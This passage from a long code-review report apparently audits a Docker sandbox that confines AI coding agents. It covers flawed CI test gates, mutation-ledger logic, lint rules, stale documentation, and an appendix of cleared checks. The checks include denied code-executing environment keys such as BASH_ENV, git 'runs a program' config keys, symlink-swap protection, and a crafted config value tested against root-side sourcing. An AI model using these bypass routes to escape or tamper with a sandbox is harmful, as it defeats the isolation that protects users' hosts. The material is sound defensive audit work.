- Location: `tests/test-layer-containment.sh: \`nightly_set="$( { sel --exclude packages; sel --tags packages; } | sort -u )"\``, and `pr_set="$(sel --tags fast --exclude needs-external,needs-dns)"`
- Introduced: 482f30a (pre-window). The window added the `services`/`mariadb` variants and the `packages-services` job without updating the model.
- What's wrong: both selections are hardcoded literals instead of being read from the workflows. `sel --tags packages` covers every variant, but nightly's packages jobs only run `--variant agents|native|services|mariadb`, and `integration-full` excludes `packages`. So the guard credits nightly with cases nightly never runs:
  - a `packages` case with no `# image:` header (the default variant);
  - any variant whose nightly job is deleted.
- PR args are also not derived from integration.yml, so a change there is invisible to the guard.
- Failure scenario: a planted case `799-planted` tagged `packages fast` with no image header is selected by the PR gate (`--tags fast --exclude needs-external,needs-dns`) and by no nightly job, yet test-layer-containment prints `PASS: PR selection ⊆ nightly selection … 0 failure(s)`. Deleting the whole `packages-services:` job (which drops 785/790/800/810 from every CI layer) also leaves the test at 0 failures.
- Evidence: I reproduced both in scratch worktree wt3. The dry-run per nightly variant shows 799 is not run; the containment test reports 0 failure(s). At HEAD every packages case declares a variant, so the breach is latent.
- Fix direction:
  - Derive each layer's run.sh argument lists from the workflow jobs (as wf_job_key does for the hermetic job), and compute nightly as the union of each job's `--dry-run`.
  - Or assert explicitly that `sel --tags packages` equals the union over the variant jobs.

### TST-3: check-ledger excuses a genuine SURVIVOR when any sibling mutant of the same identity was UNPROVEN
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced with a synthetic run record)
- Location: `tests/falsify/check-ledger.sh: \`cl_check_run()\``. The relevant code is `if [[ -n "${CL_UNPROVEN[$ident]:-}" ]]; then cl_note "UNPROVEN, not required to be classified: …"`. `cl_read_run()` sets `CL_UNPROVEN[$ident]=1` per identity, not per damage.
- Introduced: 9ce2506 (2026-08-16). The window's ratchet relies on it.
- What's wrong: an identity is `file:operator:sha1(original line)`, and one identity can carry several distinct damages (one line with two `||`, repeated identical lines). The UNPROVEN exemption is keyed on the identity. So if one damage SURVIVED and another merely timed out, the survivor needs no ledger entry and check B never fires. In this run, 149 identities carried more than one mutant, so the case is reachable. It was not hit at HEAD: the one mixed UNPROVEN identity, start-services.sh cond-negate d6e00d…, had a KILLED sibling, not a SURVIVED one.
- Failure scenario: a run whose output holds `MUTANT|SURVIVED|<id>|…` and `MUTANT|UNPROVEN|<id>|…`, checked against an empty ledger with `--strict`, returns `OK: 0 problem(s) … 1 unproven unclassified`, rc 0. Drop the UNPROVEN line and the same SURVIVED record gives `ERROR: … SURVIVED … but has no entry`, rc 1. The exemption depends on load, so a host or CI run under load can hide a real GAP.
- Evidence: repro files are in /tmp/claude-1000/-home-ihudak-dev-ai-tools-ai-containers/002098a4-b5ad-4f57-bc49-6373376abc59/scratchpad/tests-ci/cl/ (both rc's shown above). No test in tests/test-falsify-*.sh covers a mixed SURVIVED+UNPROVEN identity.
- Fix direction: exempt only identities where every non-KILLED record is UNPROVEN, i.e. track SURVIVED separately from UNPROVEN and require an entry whenever at least one record is SURVIVED.

### TST-4: tests/integration/minimal-conf.sh lets pinned values of newer keys through, so the developer's sandbox.conf leaks into the corpus images
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `tests/integration/minimal-conf.sh: \`s/^(node|python|ruby|rust|go|openjdk|graalvm-ce|graalvm-oracle|kotlin|scala|maven|gradle|db-clients|angular-cli)=.*/\1=/\``
- Introduced: when `postgres=`, `mariadb=`, `mongo=`, `playwright=` (version grammars) and the tools.d keys landed. None was added to this list.
- What's wrong: only `=ON` values and the listed version-list keys are reset. A pinned value such as `postgres=16`, `mariadb=11.4`, `mongo=8.2`, `playwright=1.50.0` or `dtctl=0.25.0` survives into every variant's config. That contradicts docs/testing.md's "A launcher case never inherits the developer's sandbox.conf".
- Failure scenario: an engine checkout with `mariadb=11.4` builds the `services` variant (`redis=ON mysql=ON mongo=ON`) with mariadb still on. build.sh then refuses: `ERROR: mysql and mariadb are both on; choose one.` → 785/790/800 FAIL as "image variant services failed to build". Separately, `postgres=16` silently adds a PostgreSQL server to the default image and to every launcher case.
- Evidence: `minimal-conf.sh dev.conf redis=ON mysql=ON mongo=ON` emits `postgres=16`, `mariadb=11.4`, `playwright=1.50.0`, `dtctl=0.25.0` unchanged.
- Fix direction: reset every non-empty value of every key to OFF or empty, not only `ON` and a hand-kept list. Or derive the list from build.sh's `validate_config`.

### TST-5: bash-dialect-lint lets post-floor constructs through (`${x@k}`, `${| …;}`, `shopt -s patsub_replacement`)
- Severity: LOW — Confidence: CONFIRMED (reproduced on ubuntu:22.04 / 24.04)
- Location: `tests/bash-dialect-lint.sh: \`'5 1|case-mod-expansion|\$\{[A-Za-z_][A-Za-z0-9_]*@[UuLKk]\}|case-modifying parameter expansion (@U/@u/@L/@K/@k)'\``, and `'5 3|dollar-brace-space|\$\{[[:space:]]|…'`
- What's wrong:
  - `@k` is bash 5.2. bash 5.1.16 reports `${x@k}: bad substitution`, but `@k` sits in a row tagged 5.1, which is permitted at floor 5.1.
  - bash 5.3's `${| cmd; }` form has no space after `${` and is not matched (bash 5.2 rejects it).
  - The 5.2 `patsub_replacement` shopt (which also changes what `&` means in `${v/p/&}`) has no row.
  - Array forms (`${a[@]@Q}`) are never matched by either expansion rule.
- Failure scenario: a probe file holding `echo "${x@k}"`, `echo "${|REPLY=hi;}"` and `shopt -s patsub_replacement` gives `bash-dialect-lint.sh probe.sh` → rc 0. Under the 5.1 floor container the first line dies.
- Fix direction: split `@k` into a `5 2` row, add `\$\{\|` (5.3) and `patsub_replacement` (5.2) rows, and allow a `[...]` subscript in the expansion regexes.

### TST-6: wf_triggers_on misses three of GitHub's four `on:` spellings, so an `exempt` workflow row's "VERIFIED not pull_request-triggered" claim can be false
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `tests/lib-layer-checks.sh: \`wf_triggers_on()\``. It only matches `on:` on its own line followed by a key indented exactly two spaces.
- What's wrong: it misses `on: pull_request`, `on: [push, pull_request]`, `on:` followed by `- pull_request`, and any indentation other than two spaces. test-layer-containment.sh calls this the verification that makes `coverage=exempt` "not merely trusted".
- Failure scenario: a new workflow `on: [push, pull_request]` that runs `./tests/run-all.sh`, registered as `workflow|x.yml|exempt|…`, passes as "verified NOT pull_request-triggered". Its steps are never classified, which is the bypass the registry exists to close.
- Evidence: wf_triggers_on returned "MISSED" for all four fixture spellings (a–d).
- Fix direction: also match the scalar and flow-list forms, and the `- name` sequence form, at any indentation. Or fail an exempt row whose `on:` is not in the one parsed shape.

### TST-7: demonstrate-needs-rebuild.sh `--help` prints the wrong lines; its cleanup leaks services/mariadb images; docs count is stale
- Severity: LOW — Confidence: CONFIRMED
- Location:
  - `tests/integration/demonstrate-needs-rebuild.sh: \`-h|--help)         sed -n '68,74p' "${BASH_SOURCE[0]}"; exit 0 ;;\``
  - its `cleanup()`: `docker rmi -f "$IT_IMAGE" "$IT_IMAGE-agents" "$IT_IMAGE-native"`
- What's wrong:
  - `--help` prints the tail of the "NAMING" paragraph and the first Usage line. It is a line-number range, which the repo's own citing rule warns about.
  - The interrupt cleanup names three of the five variant tags, so an interrupted services or mariadb rebuild leaves its multi-GB image behind. run.sh's own per-variant rmi does not run when the script is interrupted.
  - docs/testing.md says the needs-rebuild set is "nine today" and the script header says "all thirty-four". lib-rebuild.sh's predicate selects 36 at HEAD.
- Evidence: output of `bash tests/integration/demonstrate-needs-rebuild.sh --help` (shown above); `patch_needs_rebuild` over mutations/ finds 43 rebuild patches, of which 36 are outside network-mode/delivery.
- Fix direction: print the help from a marker, list the tags with `variant_image` over all known variants, and drop the hardcoded counts.

### TST-8: update-nvm-version.yml PR body claims it changed sandbox.conf
- Severity: LOW — Confidence: CONFIRMED
- Location: `.github/workflows/update-nvm-version.yml: \`- \`sandbox.conf\` — \`nvm-version\` updated\``
- Introduced: f7cdc3c (2026-08-31). It made the job edit only the Dockerfile and left the PR body template as it was.
- What's wrong: every automated PR tells the reviewer sandbox.conf was changed when it never is. AGENTS.md's "`update-nvm-version.yml` exists solely to keep the key current" is also stale: the key is empty by design now, and the job keeps the Dockerfile ARG current.
- Fix direction: drop the sandbox.conf bullet, and reword the AGENTS.md sentence to say the job maintains `ARG NVM_VERSION`.



## 8. Documentation vs code

### DOC-1: sandbox.conf says commenting out a key disables it, but the next sync turns it back on
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced)
- Location: `sandbox.conf: \`# Boolean components: set to ON to include, OFF (or comment out) to exclude.\``; `sync-to-projects.sh: \`grep -qE "^${key}=" "$project" 2>/dev/null || added+=("$key")\``
- Introduced: the header comment came in 96481ce (2026-04). It became wrong with a2ea3df (2026-07-24), which added the reconcile.
- What's wrong: `reconcile_sandbox_conf()` sees a commented-out key as missing, so it appends the upstream default.
- Failure scenario: a project disables Copilot by writing `#copilot=ON`. The same applies to claude-code, github-cli and bun, which are all ON upstream. The next `./sync-to-projects.sh` appends `copilot=ON` under a "New options synced from upstream" banner. The next `runme.sh` then rebuilds with Copilot back in, along with its allowlist fragment and its `~/.copilot` mount.
- Evidence:
  - Repro: `sed 's/^copilot=ON/#copilot=ON/' sandbox.conf > proj.conf; bash -c "source ./sync-to-projects.sh; reconcile_sandbox_conf $PWD/sandbox.conf proj.conf <emptydir>"`.
  - Output: `Reconciled sandbox.conf: appended 1 new key(s): copilot`.
  - The file then holds both `#copilot=ON` and `copilot=ON`.
- Fix direction: either change the comment to say "set OFF", or have the reconcile treat `^#\s*key=` as present.

### DOC-2: troubleshooting.md tells users to edit the Dockerfile to compile native gems; the right setting is `c-toolchain=ON`
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `docs/troubleshooting.md: \`add \`build-essential\` back to the Dockerfile if you need to install such gems at runtime\``
- Introduced: 41e820c (the README split). It went stale when 1c5e937 added `c-toolchain`.
- What's wrong: the page says only `ruby=` or `db-clients=` keep the compiler. `build.sh` also keeps it for `c-toolchain`: `build.sh: \`if has_versions ruby || has_versions db-clients || is_enabled c-toolchain; then\``.
- Failure scenario: a user edits the project's `.ai-containers/Dockerfile`. The Dockerfile is a shared file, so `sync-to-projects.sh` overwrites it on the next sync and the fix is lost without any message.
- Fix direction: point to `c-toolchain=ON` and to docs/components/c-toolchain.md.

### DOC-3: AGENTS.md says `project-init.sh` takes a path and a name, but it ignores all arguments
- Severity: MEDIUM (raised from LOW in triage: scripted use exits 1 with no output; verified that project-init.sh never reads its positional arguments). Fix batch 4, not docs-only: either implement the documented arguments or change every documented call — Confidence: CONFIRMED (reproduced)
- Location:
  - `AGENTS.md: \`./project-init.sh /path/to/myproject [optional-name]\``
  - `sync-to-projects.sh: \`Run ./project-init.sh <project-path> to register one.\``
  - `ai-containers-report.sh: \`Run ./project-init.sh <path> first\``
- Introduced: f681647 / c094411. This predates the review window, but it is still in AGENTS.md at HEAD.
- What's wrong: `project-init.sh` never reads `$1`/`$2`. It always prompts for the path (`prompt_with_default "Project path"`).
- Failure scenario: an agent follows AGENTS.md and runs `./project-init.sh /tmp/x foo </dev/null`. It exits 1 with no output. `read -p` prints no prompt when stdin is not a TTY, and the failed `read` ends the script under `set -e`. Run interactively, the arguments are silently ignored.
- Evidence: `timeout 5 ./project-init.sh /tmp/nonexist-x foo </dev/null; echo rc=$?` prints `rc=1` and nothing else.
- Fix direction: either fix the usage lines (it is interactive only), or accept positional defaults.

### DOC-4: sandbox.conf says vale "self-updates in place"; it never updates
- Severity: LOW — Confidence: CONFIRMED
- Location: `sandbox.conf: \`(agent-tools-reconcile.sh), so \`--no-cache\` does not refresh it and it\`` / `self-updates in place`. AGENTS.md's agent-tier table row says `` `vale` | pinned download ``, and the reconcile header says `vale         pinned download`.
- Introduced: 4dc252c (sandbox.conf) and 2354abc (AGENTS.md).
- What's wrong: `agent-tools-reconcile.sh: \`if [[ -x "$home_root/bin/vale" ]]; then log "vale already present"; return 0; fi\``. Vale is fetched from `releases/latest` once per group and never refreshed. It is not pinned and does not self-update.
- Failure scenario: a user expects a newer Vale and never gets it. docs/components/vale.md and docs/agent-tools.md give the correct method (delete `~/.ai-tools/bin/vale` and restart), but sandbox.conf contradicts them.
- Fix direction: in both places, say "latest at first install, no self-update" and give the delete-and-restart method.

### DOC-5: AGENTS.md and the docs point to README.md sections that no longer exist
- Severity: LOW — Confidence: CONFIRMED
- Location:
  - `AGENTS.md: \`see the README "sandbox.conf schema versioning" section\`` (twice)
  - `sandbox.conf: \`See README "sandbox.conf schema versioning".\``
  - `bump-sandbox-version.sh: \`# Rules (see README "sandbox.conf schema versioning"):\``
  - `sync-to-projects.sh: \`ensured. See README "sandbox.conf schema versioning".\``
  - `AGENTS.md: \`See the README "Ruby (via rvm)" section\``
  - `group.sh: \`see the README "Container groups" section\``
  - `docs/multiple-projects.md: \`which [migrations](../README.md) it has had applied\``
- What's wrong: README.md is now an 86-line landing page with none of these sections. The content lives in docs/multiple-projects.md (`## sandbox.conf schema versioning`), docs/components/ruby.md and docs/groups.md.
- Failure scenario: an agent about to rename or remove a sandbox.conf key looks for the migration rules in README.md and does not find them.
- Fix direction: point each reference at the docs/ file that now holds the section.

### DOC-6: multiple-projects.md names sandbox.conf "runtime keys" `mode=` and `agents=` that do not exist
- Severity: LOW — Confidence: CONFIRMED
- Location: `docs/multiple-projects.md: \`build-time keys (\`ruby=\`, \`db-clients=\`) with runtime ones (\`mode=\`, \`agents=\`),\``
- Introduced: e930d21
- What's wrong: sandbox.conf has no `mode` or `agents` key, and nothing reads one. The network mode is `SANDBOX_MODE` in sandbox.env.
- Failure scenario: a user writes `mode=restricted` in sandbox.conf. It is ignored, and the project keeps starting in the mode sandbox.env sets.
- Fix direction: drop the example, or name `SANDBOX_MODE` in sandbox.env.

### DOC-7: docs describe `<group>/.rvm/` as a directory, but it is a Docker volume
- Severity: LOW — Confidence: CONFIRMED
- Location: the `.rvm/` entry in the layout tree in docs/groups.md, and the `<group>/.rvm/` row in the mount table in docs/repos-and-mounts.md.
- What's wrong: for every group except `host`, `sandbox.sh` mounts the volume `ai-containers-rvm-<group>`: `sandbox.sh: \`config_mount_flags+=(-v "$rvm_vol:$dev_home/.rvm")\``.
- Failure scenario: a user backs up, inspects or `rm -rf`s `~/.ai-containers/<group>/.rvm`. None of that affects the real Ruby installs. The volume is left orphaned, and only `./group.sh gc` cleans it up.
- Fix direction: describe it as a volume and point to `group.sh`.

### DOC-8: getting-started.md names the wrong GitHub downloads as the reason to set `GITHUB_TOKEN`
- Severity: LOW — Confidence: CONFIRMED
- What's wrong: it says vale and goreleaser are fetched from GitHub releases at build time. Vale installs at container start, and goreleaser comes from its apt repository. The real reason, the nvm and pyenv `git clone`s (see the README and AGENTS.md), is not mentioned there.
- Failure scenario: a user without those two tools concludes the token does not apply to them. They then hit the anonymous-throttling 401.

### DOC-9: resources.md says the resource variables apply to `restricted` and `discovery` only
- Severity: LOW — Confidence: CONFIRMED
- Location: `docs/resources.md: \`These variables affect \`restricted\` and \`discovery\` runs only\``
- What's wrong: `sandbox.sh` passes `--cpus` and the memory and nofile limits in every mode, including `open`.

### DOC-10: overview.md lists "Ruby (via rvm)" among what the Dockerfile builds
- Severity: LOW — Confidence: CONFIRMED
- What's wrong: Ruby is installed at container start into the group's rvm volume. Nothing Ruby-related is baked into the image, as AGENTS.md itself states.

### DOC-11: components/README.md says no agent CLI is baked into the image; Kiro is
- Severity: LOW — Confidence: CONFIRMED
- Location: `docs/components/README.md: \`The agent CLIs themselves are **not baked into the image**\``. This sits under a table that includes `kiro`.
- What's wrong: Kiro is baked (`Dockerfile: \`ARG INSTALL_KIRO=0\``), and the runtime list leaves it out (`sandbox-common.sh: \`for a in claude-code copilot codex gemini graphify vale mkdocs\``).
- Failure scenario: a user restarts the container or runs a plain `./build.sh` to get a newer Kiro. Only `./build.sh --no-cache` refreshes it.

### DOC-12: graphify.md says `~/.claude` is mounted from the host, so the skill appears "in every subsequent container"
- Severity: LOW — Confidence: CONFIRMED
- Location: `docs/components/graphify.md: \`Because \`~/.claude/\` is bind-mounted from the host\``
- What's wrong: the mount comes from the group (`"$group_root/.claude"`). It is the host's own `~/.claude` only when `AI_CONTAINER_GROUP=host`.
- Failure scenario: `graphify install` in a `default`-group container does not reach other groups, or Claude Code on the host.

### DOC-13: AGENTS.md's list of optional components omits `acli` and `db-clients`
- Severity: LOW — Confidence: CONFIRMED
- Location: `AGENTS.md: \`Optional components: \`copilot\`, ...\``
- What's wrong: both are sandbox.conf keys and are documented later in the file, but this list, which is presented as the whole set, leaves them out. The version-list keys (`node`, `python`, `ruby`, `rust`, `go`, `nvm-version`) are covered separately, so they are fine.


---

# Appendix: what each reviewer checked and cleared

## GIT


- **`git_dirs_in` discovery/pruning** — vendor/node_modules/.venv/target pruned by
  name but *not* under `*/.git/*` (so a submodule in `.git/modules` is still
  found); objects/refs/logs pruned; `.git` files/links/dirs classified correctly;
  unreadable `.git` dirs routed to the unreadable bucket. Repro confirmed a real
  `.git` is found and the pruned siblings are skipped.
- **commondir placeholder + refusal** — writes `./` (git treats as no commondir;
  libgit2 refuses `.`), refuses any other value in a real repo dir
  (`-d objects && -f config` gated, so linked-worktree dirs that legitimately
  carry a commondir do not trip it). The earlier `.` placeholder (5793a34) was
  replaced by `./` (91fac80) the *same day, before the v0.10.0 tag* — never
  released, so no upgrade false-refusal. Not a finding.
- **`config.worktree` placeholder** — created empty only when
  `extensions.worktreeConfig` is on; read back via the commondir for worktrees.
- **`_git_config_get` / `_git_config_bool`** — both prefer real `git config
  --file` (pure parse, executes nothing, triggers no fetch) with an awk fallback;
  awk bool matches git's truthiness; safe.
- **`_git_exec_keys` / `_git_include_paths`** — use `git config --file --null
  --list` / `--get-regexp`, which only parse the named file and run nothing;
  the exec-key regex and the `!`-alias / `submodule.*.update` / boolean-fsmonitor
  carve-outs match git's own "runs a program" semantics. These are *not* the
  GIT-1 vector (they never operate on live config).
- **SANDBOX_GIT_MAX** — numeric validation `^[1-9][0-9]{0,5}$`, refusal names up
  to 5 overflow dirs, every repo protected (no silent cap). `>30` NOTE fires
  correctly. Logic sound.
- **pins of the git dir** — directories from mount root down to `.git` bound
  `:rw` onto themselves so `.git` can't be renamed out (mutation 466 proves it);
  shallowest-first so a repo under an existing `:ro` overlay is skipped.
- **hooks symlink / include.path NOTE+WARNING logic** — judged after overlays via
  `_link_walk`/`_walk_exposed`/`_path_walk`, bounded to githooks(5) names; these
  are advisory warnings and are correct in intent.
- **named-group vs host-group scanning** — `_git_skip_root` set to the resolved
  group root for non-host groups and skipped in the git loop; host group is
  scanned. Matches the spec.
- **set -e hazards** — `git_dirs_in` ends `return 0`; the `mapfile < <(git …)`
  and `$(cat commondir)` substitutions are failure-tolerant; no unguarded
  failing command in the git loop that would abort the launch.

## LNCH

- `-v` parsing in `launcher_ro_overlay`:
  - `:ro` is detected among comma-separated options.
  - Named volumes and file binds are correctly ignored.
  - Sources are canonicalised with `pwd -P`.
  - Containment is compared per path component (`/x/pro` vs `/x/proj`).
  - No caller passes writable host binds via `--mount`, so `-v`-only parsing misses nothing.
- Shallowest-first ordering:
  - A pin can never land inside an existing `ro_dsts` entry, because a candidate inside one is skipped before its pins are computed.
  - Unrepresentable launchers leave nested ones to be handled, and pins through an unrepresentable name fail with them.
- Pins: every directory between the mount root and the launcher gets one, keyed by destination, so two mounts exposing the same launcher each get their own set. A move of the directory above the launcher is refused (case 455).
- Unlistable handling: the `find` predicate matches the AGENTS.md description (owner class exact for you, kernel `-r`/`-x` otherwise, agent reachability from mode bits and its single group). A mount root you cannot list refuses the launch. Identity is validated (numeric, ≤ 4294967294).
- `_bind_mount_arg` / `_mount_representable` / `_utf8_valid`:
  - CSV quoting and `""` doubling for `--mount`.
  - The `:`-only switch to `--mount`.
  - Refusal of a trailing Unicode-space or CR value via `--mount`.
  - `od`/`awk` UTF-8 validation: overlongs, surrogates, > U+10FFFF and truncated sequences all fail; ASCII and empty pass.
- `_link_walk` / `_path_walk` / `_readlink_exact` / `_walk_exposed`:
  - Kernel-style resolution: `..` is taken from the physical directory, and `^` marks the directories stepped out of.
  - The 40-link loop bound.
  - The exact target read via `readlink -n` + sentinel.
  - The home exemption that still judges the launcher's own writable inner binds.
  - Mount-point exemption only for `replace` steps.
- The symlink-on-reached-path warning works, because `script_dir` is logical (`pwd`), not physical.
- Concurrent-swap manifest:
  - A symlink swap before the manifest stat (no `-L`, so the link's own inode is recorded) or after it both produce a mismatch at the entrypoint.
  - NUL-separated records survive any destination name.
  - A failed stat records `0 0`, which fails closed.
  - The anchor and manifest come only from launcher `-e`/`-v`, never from container.env.
  - The EXIT trap also runs on SIGHUP/SIGTERM; the sweep needs both an age of over 60 min and a dead pid, never fails the launch, and cannot hit a group dir, since group names cannot start with `.`.
  - `group.sh` globs ignore `.verify-*`.
- GNU/BSD `stat` probe: done once, output validated, no fallback-on-failure.
- `verify_launcher_mounts` under `set -euo pipefail`: unreadable or missing manifest gives a NOTE, anchor mismatch gives a NOTE, entry mismatch gives `exit 1`. `tests/test-launcher-verify.sh` runs it under `-e`, and mutation 461 is killable on a preserving host.
- Tests: hermetic `tests/test-launcher-dir-ro.sh` (45 groups) and `tests/test-launcher-verify.sh` pass at HEAD. Cases 450/455/460 have paired positive controls (writable marker/root) and do not look vacuous. T38's claim is the one LNCH-1 defeats (it plants links in only one launcher).

## ENV

- `container_env_filter()` against docker's `parseKeyValueFile`: BOM on line 1 only, `unicode.IsSpace` leading trim (the uws list matches Go's White_Space set), one CR dropped by bufio, the 65535/65536 line limit, UTF-8 checked on non-comment lines (comments are dropped before docker sees them, so docker's whole-file UTF-8 failure cannot happen), `export NAME=`, whitespace in names. Every remaining divergence errs toward refusing.
- The launcher `-e` set is read from `launcher_env` itself, including conditional `${X:+-e …}` entries. `AI_CONTAINER_ENV_KEYS` and `_aice_*` are reserved. `AI_LAUNCHER_ANCHOR` set from container.env when no verify dir exists is harmless, because stash runs before `verify_launcher_mounts`.
- The held-open fd (`exec {_app_fd}< <(…)`) is inherited by docker, and there is no pipe-buffer deadlock (docker reads the file before anything else). Keys are joined with the default IFS.
- `stash_app_env()`: the `_aice_` namespace, `unset -v`, splitting without `read`, readonly names skipped. Nothing before it reads the environment except bash's own start-up, and every start-up key that executes code (BASH_ENV, SHELLOPTS, BASH_FUNC_*, PS4, ENV, POSIXLY_CORRECT, …) is denied. FUNCNEST, TMOUT, TEXTDOMAIN* and image ENV overrides (NVM_DIR etc., which no root-side script reads) were checked and are harmless.
- Every root step after the stash (link_default_ruby, link_agent_tools, firewall, daemons) runs without app env. `run_services` prepare uses `env -i`; start strips the runner's path overrides. `as_sandbox_user` and the capsh `exec env "$@" /bin/bash -l` hand-over are correctly quoted.
- Case 320 and mutations 320–322 all `git apply --check` cleanly and target the right halves. Root's environment is read from a root daemon's /proc environ, not from `docker exec`.
- `repos_path_in_container()`: path-component prefix match, resolve_path on both sides, fallback to /workspace.
- SKILL_CHAR_BUDGET / SLASH_COMMAND_TOOL_CHAR_BUDGET defaults, host override, refused from container.env through `-e`.
- CONTAINER_NAME derivation: leading-character strip, `workspace` fallback, PID suffix keeps it ≥2 characters.
- `selinux_security_opt()` and every caller: sandbox.sh, all five repo.sh seed paths (with `ensure_seed_image` before each, including `collect_inspections` and `reset_one`), `rvm_volume_ensure`, extract-discovery.sh, and verify-on-host.sh in a subshell (sourcing sandbox-common.sh prints nothing to stdout).
- `--shm-size` only when `CONTAINER_SHM_SIZE` is set or playwright is active. The `.gradle/.m2` gate is `any_has_versions` over the JVM keys. The `.yarn/.aws/.azure/.kube` gating, and `read -ra` splitting of multi-path `config_dir`.
- DOCS_PATH / ARCHITECTURE_REPO_PATH: `parse_pointer_spec` suffixes, `@name` desugar into REPOS, primary and already-mounted re-pointing.
- `load_env_defaults` parsing: set-if-unset precedence, matched-quote strip, CR tolerance.
- The hermetic tests test-env-file, test-repos-path, test-skill-char-budget, test-container-name, test-selinux-label, test-tool-config-mounts, test-architecture-path, test-host-preflight and test-sourced-guards all pass at HEAD, and each fails loudly when the launch never reaches docker.

## RT

- Python version arithmetic in `install_uv`: `minor > 0` guards x.0, 3.10 becomes 3.9, and both values are checked as numeric before use. The retry keeps the extra arguments (mkdocs `--with mkdocs-material`).
- `UV_PYTHON_INSTALL_DIR` is exported in the reconcile and in profile.d. `--no-managed-python` is on the first attempt and on the probe.
- `install_claude_native`: picks the version with `sort -V`; the EOF-read pitfall is handled; an empty versions dir (literal `*`) falls through to install; it keys on the persisted dir rather than the ephemeral launcher.
- `link-agent-tools.sh`: links only `AI_RUNTIME_TOOLS` members with an exact comma match, removes a stale link for a disabled tool, does not link a missing binary, and always exits 0. No `~/.ai-tools` bin dir is on the baked PATH. The leftover-Claude fallback is gated on claude-code.
- nvm prefix: no `.npmrc`, `prefix=` or `NPM_CONFIG_PREFIX` is baked. `npm-agent-tools` is a function. The reconcile passes `--prefix` on each npm call.
- Non-fatal claims: every entrypoint caller ends in `|| true`; the reconcile and the link scripts exit 0 on install failures; an `exec 9>` failure on the lock degrades to running without the lock rather than aborting.
- `link-node-globals.sh`: package-name parsing for scoped and unscoped packages, npm and corepack skipped, refusal to overwrite a foreign destination, the qmd wrapper's quoting, and failing the build on an unresolvable link. Its ordering after every `npm install -g` layer is tested.
- rvm-reconcile.sh: flock, re-bootstrap of a half-written rvm, literal whole-line version match, a default that is set only once and only to an installed version. /etc/profile.d/rvm.sh is OK.
- Hermetic tests test-agent-tools-reconcile / test-link-agent-tools / test-link-node-globals / test-runtime-tools-csv all pass. Mutation patches 700–760 still apply (`git apply --check`).

## PRJ

- shared-files.sh completeness: I grepped every `source`/`.`/script-dir reference and every `*.sh` name in non-comment code of every shared file. Each one resolves to a listed file or to a directory that is rsynced (tools.d, services.d, allowlist-*.d). The extra names were `runme.sh`, `project-init.sh` (version.sh uses it only as a base-repo discriminator), and false positives (install.sh, name.sh, 1.sh). repo-git-reset.sh, bash-floor.sh, host-preflight.sh and version.sh are all present. The Dockerfile COPY sources are checked by test-shared-files-parity. migrations/ is not needed in a project, because hooks run from the base repo.
- version.sh: the recorded `engine-version` takes priority over git, git is asked only when project-init.sh is present, and a stale record is removed when the version is unknown.
- sync-to-projects.sh: `conf_key_comment` (blank-line reset keeps the file header's `# schema-version` out of appended blocks; verified), the mktemp-guarded `conf_set_version`, the numeric hook ordering (`10#$nnn`), the inner `.gitignore` backfill, and that `backfill_sandbox_env` cannot pick up a shared script (none contains a literal `export IMAGE_NAME=`).
- check-sandbox-version.sh / bump-sandbox-version.sh: `comm` input is sorted consistently in the same locale; the slug and duplicate checks are sound.
- repo-git-reset.sh: primary detection order, the destructive pass failing safe on ambiguous `refname:short`, and record parsing/rendering in `reset_git` (unknown records are printed verbatim).
- repo.sh: confirmation gates for rm/reset/gc (TTY or `--yes`), the reset flow from inspect to the approved branch, SELinux option resolution before side effects, and the registry upsert/remove.
- extract-discovery.sh: the coverage matching mirrors `matches_wildcard_domain()`, deletes remove only fixed basenames, and `--clean`/`--discard` are mutually exclusive.
- migrate-runme.sh: parse_exports/parse_invocation, no-clobber backups, sourcing guard in project-init.sh (`(return 0 2>/dev/null)`).
- changelog-coverage.sh: diff against the first parent, here-string grep (no SIGPIPE), skips outside git.
- Hermetic tests run: test-repo-destructive, test-repo-registry, test-repo-git-reset, test-group-lifecycle, test-project-init, test-sync-project, test-shared-files-parity, test-extract-discovery, test-version, test-migrate-runme, test-rsync-preflight, test-report and test-check-sandbox-version all PASS under C.UTF-8. Under en_US.UTF-8 only test-repo-destructive fails (PRJ-7).

## SVC

- **Root boundary in `prepare`.** `entrypoint.sh: run_services()` runs `prepare` under `env -i` with a fixed PATH and only AI_SERVICES/SANDBOX_UID/SANDBOX_GID. AI_SERVICES comes from a launcher `-e`, which container.env cannot set. Service names are held to `NAME_RE` and must be an existing file in the image's root-owned `/etc/ai-containers/services.d`, so a crafted `sandbox.conf` value (e.g. `postgres=17,foo=bar`) cannot get root to source anything else. Every adapter default that root reads or executes in `prepare` (PG major file, lib root, socket dirs, `--version` probes) is an image path. `start` drops the runner's path overrides (`AI_SERVICES_DIR/STATE_ROOT/LOG_ROOT`) in two ways: filtered from the stash and `env -u`.
- **Injection.** `prepare` creates only image-default directories, before any agent process exists. On the SQL side, postgres identifiers are double-quoted with `"` doubled, and role/db names are held to `^[a-z_][a-z0-9_]*$`; the superuser name is quoted but not held to the pattern. MySQL user names go through `_mysql_str` (backslash and `'` escaped), passwords too, and database names are regex-held before backtick quoting. No injection found.
- **Watchdog.** `start-services.sh: run_bounded()` puts the command in its own process group, signals the group, falls back to the PID, re-KILLs the group after `wait`, and rejects `TIMEOUT=0`. `set -m` in a non-interactive shell prints no job notices (checked, with and without a tty). The only leftover is an orphaned `sleep` for at most TIMEOUT seconds per service, which is harmless. Daemonised servers (`redis --daemonize`, `mysqld --daemonize`, `mongod --fork`, pg_ctl's postmaster) are outside the group. mariadbd stays in it, which is correct: a timeout kills it.
- **Readiness.** Redis compares the INFO `process_id` with its own pid file; Redis writes the pid file only after binding. MariaDB compares `@@pid_file` with this start's path. mysqld `--daemonize`, `mongod --fork` and `pg_ctl -w` each wait on their own child. Another server cannot pass for any of them, except in the env-redirection case in SVC-1.
- **IPv6.** The `/proc/net/if_inet6` regex `^0{31}1 .* lo$` matches the kernel's format. Redis's `-::1` is optional. MySQL 8.0.13+ and MariaDB 10.11 accept comma lists in `--bind-address`. Postgres `listen_addresses='localhost'` tolerates a missing ::1. The integration listener checks use the right hex ports (1538/18EB/0CEA/8124/6989) and the right `/proc/net/tcp6` encoding of ::1.
- **Adapter contract.** All five adapters define the five functions, every `svc_provision` returns 0, and nothing outside the watchdog can block.
